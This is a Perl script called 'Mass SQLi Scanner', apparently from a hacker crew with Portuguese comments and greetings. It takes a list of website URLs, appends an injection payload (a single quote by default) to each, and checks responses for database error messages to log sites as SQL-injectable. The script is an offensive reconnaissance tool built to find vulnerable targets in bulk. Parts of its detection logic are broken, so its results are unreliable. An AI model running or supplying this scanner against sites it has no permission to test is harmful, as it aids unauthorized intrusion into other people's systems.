#!/usr/bin/perl

#    Mass SQLi Scanner
#    Coder: v4p0r
#    Date: 03 DEZ 2017 - 22:43
#
#   Greetz:  YC - HighTech - EOF Club - Brian - d3m0l1d0r - Cater - Strike - rCent - Tr4xb0y - Hannes
#   Kodo - CrazzyDuck - xin0x - MMxM - CriptonKing - b33ck - d3z3n0v3 - c0de_universal - All Friends

use strict;
use warnings;
use Getopt::Long;
use WWW::Mechanize;

my $usr = $^O;

if ($usr eq "MSWin32") {
    system ("cls");
    system ("title [!] Mass SQLi Scanner");
} else {
    system ("clear");
    system ("title [!] Mass SQLi Scanner");
}

$| = 1;

my $banner = @ARGV;

my ($checkerror_, $testar_site, $site, $printerror, $pm);
my (@oracle, @db2, @jdbc, @odbc, @sybase, @mariadb, @mysql, @postgresql, @msacess);

my @errorlist=("ORACLE SQL", "DB2", "JDBC", "ODBC", "SYBASE", "MARIADB", "MYSQL", "POSTGRESQL", "MSACESS");
my @error_oracle = ("ORA-00921: unexpected end of SQL command", "ORA-01756", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended");
my @error_db2 = ("DB2 ODBC", "DB2 error", "DB2 Driver");
my @error_jdbc = ("Error Executing Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver");
my @error_odbc = ("ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver");
my @error_sybase = ("Warning: sybaserror_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "sybaserror_", "ODBC Driver");
my @error_mariadb = ("MariaDB server version for the right syntax");
my @error_mysql = ("You have an error in your SQL", "Warning: mysql_", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "MySQL Driver", "mysqli.query", "num_rows", "mysql error:","supplied argument is not a valid MySQL result resource", "on MySQL result index", "Error Executing Database Query", "mysql_");
my @error_postgresql = ("Warning: pg_", "PostgreSql Error:", "function.pg", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", ": pg_");
my @error_msacess = ("Microsoft JET Database", "ADODB.Recordset", "500 - Internal server error", "Microsoft OLE DB Provider", "Unclosed quotes", "ADODB.Command", "ADODB.Field error", "Microsoft VBScript","Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark", "Microsoft OLE DB Provider for Oracle", "Active Server Pages error", "OLE/DB provider returned message","OLE DB Provider for ODBC", "error \"800a0d5d\"", "error \"800a000d\"", "Unclosed quotation mark after the character string", "SQL Server", "Warning: odbc_");

my @checkerror = (@error_oracle, @error_db2, @error_jdbc, @error_odbc, @error_sybase, @error_mariadb, @error_mysql, @error_postgresql, @error_msacess);

my ($optList, $optSite, $optSave, $optPayload, $optHelp, $payload, $save, $list);

GetOptions(
    'list|l=s'     => \$optList,
    'site|u=s'     => \$optSite,
    'payload|p=s'  => \$optPayload,
    'save|s=s'     => \$optSave,
    'help|h'       => \$optHelp
);

if ($optHelp) { 
    &ascii;
    
    print "\n Usage: $0 [comando]\n\n"   .
          " [+] Comandos:\n\n"           .
          "  --list    [Checa uma lista de sites]\n"        .
          "  --site    [Testa um unico site]\n"             .
          "  --payload [Seleciona um payload desejado]\n"   .
          "            [Default > %27 <]\n"                 .
          "  --save    [Onde os sites vuln serao salvos]\n" .
          "            [Default > save_sqli.txt]\n\n"       .
          "[!] Exemplos:\n\n".
          "  perl $0 --list vulns.txt --save sqli.txt\n"             .
          "  perl $0 --list vulns.txt --payload ' --save sqli.txt\n" .
          "  perl $0 --site localhost/index.php?id=1 \n";
    exit;

}
    
if ($optPayload) {
    $payload = $optPayload;
} else {
    $payload = "%27";
}

if ($optSave) {
    $save = $optSave;
} else {
    $save = "save_sqli.txt";
}        

if ($optSite) {
    &ascii;
    my $site = $optSite;
    req($site);
    exit;
}

sub checkvulns {
    
    my ($testar_site,$site) = @_;
    my $get_error = join("|", @checkerror);
        if ($testar_site =~ /^$get_error$/) {
            foreach $checkerror_(@checkerror) {
                if ($testar_site =~ /$checkerror_/g) {
                    if (grep( /^$checkerror_$/, @error_oracle)) { 
                        push(@oracle, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_db2)) { 
                        push(@db2, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_jdbc)) { 
                        push(@jdbc, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_odbc)) { 
                        push(@odbc, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_sybase)) { 
                        push(@sybase, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_mariadb)) { 
                        push(@mariadb, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_mysql)) { 
                        push(@mysql, $checkerror_); 
                    }
                    if (grep( /^$checkerror_$/, @error_postgresql)) { 
                        push(@postgresql, $checkerror_); 
                    } 
                    if (grep( /^$checkerror_$/, @error_msacess)) { 
                        push(@msacess, $checkerror_); 
                    }
                }
            }
                
        if (@oracle) { 
            $printerror = $oracle[0];
            printerrors($errorlist[0], $printerror, $site, $payload);  
        }  
        if (@db2) { 
            $printerror = $db2[0];
            printerrors($errorlist[1], $printerror, $site, $payload); 
        }
        if (@jdbc) { 
            $printerror = $jdbc[0];
            printerrors($errorlist[2], $printerror, $site, $payload); 
        }
        if (@odbc) { 
            $printerror = $odbc[0];
            printerrors($errorlist[3], $printerror, $site, $payload); 
        }
        if (@sybase) { 
            $printerror = $sybase[0];
            printerrors($errorlist[4], $printerror, $site, $payload); 
        }
        if (@mariadb) { 
            $printerror = $mariadb[0];
            printerrors($errorlist[5], $printerror, $site, $payload); 
        }
        if (@mysql) { 
            $printerror = $mysql[0];
            printerrors($errorlist[6], $printerror, $site, $payload); 
        }
        if (@postgresql) { 
            $printerror = $postgresql[0];
            printerrors($errorlist[7], $printerror, $site, $payload); 
        }
        if (@msacess) { 
            $printerror = $msacess[8];
            printerrors($errorlist[8], $printerror, $site, $payload); 
        }
    } else {
        print "\n[!] [NOT VULN]\n";
    }
}

sub printerrors { 

    my ($printerror, $errorlist, $url) = @_;
    
    print "\n[!] TYPE ERROR: [" . $printerror . "]\n";
    print "[!] ERROR: [" . $errorlist . "]\n" . "\r";
    
    open(my $fh, '>>', $save);
    print $fh "\n[!] SITE: " . $url . "\n" . "[!] PAYLOAD: " . $payload . "\n" . "[!] TYPE ERROR: " . $printerror . "\n" . "[!] ERROR: " . $errorlist . "\n";
    close $fh;

}

sub req {

    my ($site) = @_;
    
    $site = 'http://' . $site if $site !~ /^https?:\/\//;
    
    print "\n[!] SITE: " . $site;
    print "\n[!] PAYLOAD: " . $payload;
    
    my $sql = $payload;
    my $url = $site . $sql;
    
    my $req = WWW::Mechanize->new(agent => 'Mozilla 5.0');
       $req->timeout(3);
       $req->max_size(1024000);
       $req->protocols_allowed(['http', 'https']);
       $req->get($url);

    my $testar_site = $req->content;
    checkvulns($testar_site, $site, $payload);
    
}

&ascii;
if($banner <= 1) {

    print "# Team: Yunkers Crew\n" .
    "# Twitter: 0x777null\n".
    "# Skype: drx.priv\n\n" .
    "# Usage: perl $0 --help\n";
    
    exit;
}

open my $list1, '<' , $optList;
my @file = <$list1>;
    
print "\n[+] Lista a ser checada: [" . $optList . "]\n";
print "[+] Onde sera salvo: [" . $save . "]\n";
print "[+] Quantidade de URL's: [" . scalar(@file) . "]\n";

foreach $site(@file) {
    req($site);
}

sub ascii {
print q{
*      ___
     /`   `'.          *        *       *       *       *             
    /   _..---;  *
    |  /__..._/  .--.-.    *             *                    *
 *  |.'  e e | ___\_|/____   
   (_)'--.o.--|    | |    |  Mass SQLi Scanner      *
  .-( `-' = `-|____| |____|  Coder: v4p0r       *
 /  (         |____   ____|  Date: 01 NOV 20         *          *
 |   (        |_   | |  __|  Gretz: YC - HighTech - We BoyZ and All Friends
 |    '-.--';/'/__ | | (  `|   *
 |      '.   \    )"";--`\ /               *           *
 \        ;   |--'    `;.-'       *               *                 *
 |`-.__ ..-'--'`;..--'`    
   *         *         *             *         *          *
};

}

print "\n[!] Finish Scan HOHOHO! Feliz Natal e um Prospero Ano Novo Cambada!!\n"